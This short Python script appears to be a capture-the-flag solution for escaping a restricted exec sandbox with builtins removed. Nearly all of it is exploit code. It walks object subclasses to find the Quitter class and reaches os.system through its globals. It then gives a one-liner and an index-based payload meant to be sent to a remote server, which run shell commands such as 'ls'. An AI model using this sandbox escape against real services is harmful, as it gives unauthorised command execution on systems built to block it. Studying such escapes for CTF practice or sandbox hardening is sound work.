# for testing at local 
# text = ""
# text = str(input())
# exec(text, {'__builtins__': None, 'print':print})

# try to list all the class of class type #list and find the Quitter
for i in [].__class__.__base__.__subclasses__():
    print(type(i))
    if i.__name__ == "Quitter":
        print(type(i))
        i.__init__.__globals__['sys'].modules['os'].__dict__['system']('dir')

# oneshot for listing at the server
print([(i) for i in [].__class__.__base__.__subclasses__() if i.__name__=='Quitter'][0].__init__.__globals__['sys'].modules['os'].__dict__['system']('ls'))


# using this to input to the shell by exec ; -3 is the reverse index of Quitter in listing class
[].__class__.__base__.__subclasses__()[-3].__init__.__globals__['sys'].modules['os'].__dict__['system']('ls')

# from cheaterdxd with love
